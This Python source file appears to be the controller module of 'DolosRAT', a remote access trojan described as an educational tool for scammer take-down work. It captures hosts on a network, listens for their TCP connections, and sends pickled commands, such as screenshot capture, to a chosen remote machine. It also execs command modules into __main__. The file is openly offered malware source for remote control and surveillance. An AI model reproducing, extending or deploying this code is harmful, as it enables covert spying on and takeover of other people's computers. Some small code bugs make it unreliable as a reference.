# !/usr/bin/env python
# -*- coding: utf-8 -*-
#----------------------------------------------------------------------------
# Creator : Ryan I.
# Created Date: 24/06/2023
# version ='1.0'
# ---------------------------------------------------------------------------
"""
DolosRAT provides a GUI-based RAT client and server, purposed for demonstrating
techniques frequently used within scammer take-down operations. Please note that
the use of this tool is for educational purposes only.
"""

# Built-in/Generic Imports.
import sys
from enum import Enum, auto
from operator import attrgetter
from time import sleep
from typing import List

import inspect
from importlib import util

import __main__

# Modules.
from config.network import network_conf # pylint: disable=import-error
from commands.command import Command # pylint: disable=import-error
import commands.window
from commands.window import ScreenshotCommand # pylint: disable=import-error
from utils.misc.encoder import Pickle # pylint: disable=import-error
from utils.misc.threading import threadpooled # pylint: disable=import-error
from utils.net.capture import get_ipv4_capture # pylint: disable=import-error
from utils.net.interface import IfaWrapper, IPv4Host # pylint: disable=import-error
from utils.net.server import get_tcp_server_wrapper # pylint: disable=import-error

host_status_poll_started: bool = False

class HostStatus(Enum):
    """_summary_

    Args:
        Enum (_type_): _description_
    """

    Listening = 0
    Connected = auto()
    Disconnected = auto()
    
def _mainify_command(mod: object) -> None:
    """_summary_

    Args:
        mod (object): _description_
    """

    mod_source = inspect.getsource(mod)
    mod_spec = util.spec_from_loader(mod.__name__, loader=None)
    mod_type = util.module_from_spec(mod_spec)
    exec(mod_source, __main__.__dict__)
    sys.modules[mod.__name__] = mod_type
    globals()[mod.__name__] = mod_type
    
def _mainify_commands() -> None:
    """_summary_
    """
    
    for mod in [commands.window]:
        _mainify_command(commands.window)
    
def _update_btns_host_connected(top_level: object) -> None:
    """_summary_
    """

    # Enable relevant action buttons.
    if network_conf.conf['selected_host'].connected:
        # If host is connected to.

        # Top-left buttons - enabling all.
        # top_level.top_col_frame_1.btn_1.enable_btn()
        top_level.top_col_frame_1.btn_2.enable_btn()
        top_level.top_col_frame_1.btn_3.enable_btn()
        top_level.top_col_frame_1.btn_4.enable_btn()

        # Middle-left buttons.
        top_level.top_col_frame_2.btn_2.disable_btn()
        top_level.top_col_frame_2.btn_3.disable_btn()
        top_level.top_col_frame_2.btn_4.enable_btn()

    else:
        # If host is not connected.

        # Top-left buttons.
        # top_level.top_col_frame_1.btn_1.disable_btn()
        top_level.top_col_frame_1.btn_2.disable_btn()
        top_level.top_col_frame_1.btn_3.disable_btn()
        top_level.top_col_frame_1.btn_4.disable_btn()

        # Middle-left buttons.
        top_level.top_col_frame_2.btn_4.disable_btn()
        top_level.top_col_frame_2.btn_2.enable_btn()
        top_level.top_col_frame_2.btn_3.enable_btn()
        
def _set_host_status(top_level: object, host: IPv4Host, status: HostStatus = 1) -> None:
    """_summary_

    Args:
        top_level (object): _description_
        host (IPv4Host): _description_
        status (HostStatus, optional): _description_. Defaults to 1.
    """

    # Houses the text in which to replace the older
    # status texts with.
    replacement_str = ''

    # Extract IPv4 address and port
    # from selected host.
    ipv4_addr, port = attrgetter(
        'ipv4_addr', 'port'
    )(host)

    # Get text of relevant host listbox item.
    host_btn_text = \
        top_level.top_col_frame_3.get_item_text(
            f'{ ipv4_addr }:{ port } '
        )

    # Check status value and set replacement
    # string accordingly.
    match status:
        # 'Listening'
        case 0:
            # Set string to '[Listening]'
            replacement_str = '[Listening]'
        case 1:
            # Set string to '[Connected]'
            replacement_str = '[Connected]'
        case _:
            # Defaults to '[Disconnected]'
            replacement_str = '[Disconnected]'
                
    # Remove '[Disconnected]' string and
    # append '[Connected]'.
    top_level.top_col_frame_3.edit_item(
        host_btn_text,
        host_btn_text.replace(
            '[Disconnected]', ''
        ).replace(
            '[Connected]', ''
        ).replace(
            '[Listening]', ''
         ) + replacement_str
    )

@threadpooled
def _check_all_hosts_connected(top_level: object) -> None:
    """_summary_

    Args:
        top_level (object): _description_
    """
    
    # Indicates that this should not be repeated.
    host_status_poll_started = True
    
    # Run continously in the background.
    while True:
        
        try:

            # Iterate through each enumerated host.
            # for host in network_conf.conf['hosts_list']:
            for host in network_conf.conf['hosts_list'].union({network_conf.conf['selected_host']}):
                
                # Check if listening for host.
                if host.listening:
                    # Amend to '[Listening]'.
                    _set_host_status(top_level, host, 0)
                    continue

                # Check if selected host is connected to - set
                # when TCP connection is initiated.
                elif host.connected:
                    # Amend to '[Connected]'.
                    _set_host_status(top_level, host, 1)
                    continue

                # Edge-cases or if disconnected.
                else:
                    # Amend to '[Disconnected]'.
                    _set_host_status(top_level, host, 2)
                    continue
                
        except (KeyboardInterrupt, RuntimeError):
            break
        
        # Check every 10s.
        sleep(5)
        
def _send_command(command: Command) -> None:
    """_summary_

    Args:
        command (Command): _description_
    """
    
    ...

def get_ifas() -> List[str]:
    """_summary_

    Returns:
        List[Ifa]: _description_
    """

    # Returh list of interface names for
    # drop-down list.
    return [
        str(ifa.ifa_name)
        for ifa in network_conf.conf['ifas_list']
    ]

def option_change_ifa(ifa_name: str) -> None:
    """_summary_
    """

    # Sets new interface in global
    # networking configuration.
    IfaWrapper.set_ifa(ifa_name)

def btn_collect_ipv4s(top_level: object) -> None:
    """_summary_
    """

    def update_host_list() -> None:
        """_summary_
        """

        # Remove 'Please wait...' button.
        top_level.top_col_frame_3.remove_item(
            'Please wait...'
        )

        # Iterate through list of collected hosts.
        for host in list(network_conf.conf['hosts_list']):

            # Text for connection status.
            connected_str = (
                '[Connected]' if host.connected
                else '[Disconnected]'
            )

            # Add entries in listbox for each host.
            top_level.top_col_frame_3.add_item(
                f'{ host.ipv4_addr }:{ host.port } ' \
                    f'{ connected_str }'
            )

    # Add 'Please wait...' button to indicate progress.
    top_level.top_col_frame_3.add_item(
        'Please wait...',
        'disabled'
    )

    # Initialise IPv4 capture and
    # commence.
    get_ipv4_capture().capture()

    # Update host list.
    top_level.after(17000, update_host_list)

def btn_select_host(btn: object, top_level: object) -> None:
    """_summary_

    Args:
        top_level (object): _description_
    """

    # Selects the host.
    IfaWrapper.set_host(btn.cget('text'))

    # Change foreground colours of each button
    # to give the effect of deselection.
    for _btn in top_level.top_col_frame_3.get_items():
        _btn.configure(fg_color='transparent')

    # Highlight button selected.
    btn.configure(fg_color='#106A43')

    # Enable/disable relevant buttons based
    # upon connected/disconnected status.
    _update_btns_host_connected(top_level)

def btn_listen(top_level: object) -> None:
    """_summary_
    """

    # Initialise TCPServerWrapper and
    # commence listening for selected host.
    get_tcp_server_wrapper().run()

    if not host_status_poll_started:
        _check_all_hosts_connected(top_level) 

def btn_send_command_screenshot(top_level: object) -> None:
    """_summary_
    """
    
    host_addr, host_port = attrgetter(
        'ipv4_addr', 'port'
    )(network_conf.conf['selected_host'])
    
    pickled_command = Pickle.enc(ScreenshotCommand())

    IfaWrapper.edit_host(host_addr, host_port, 'command', pickled_command)

_mainify_commands()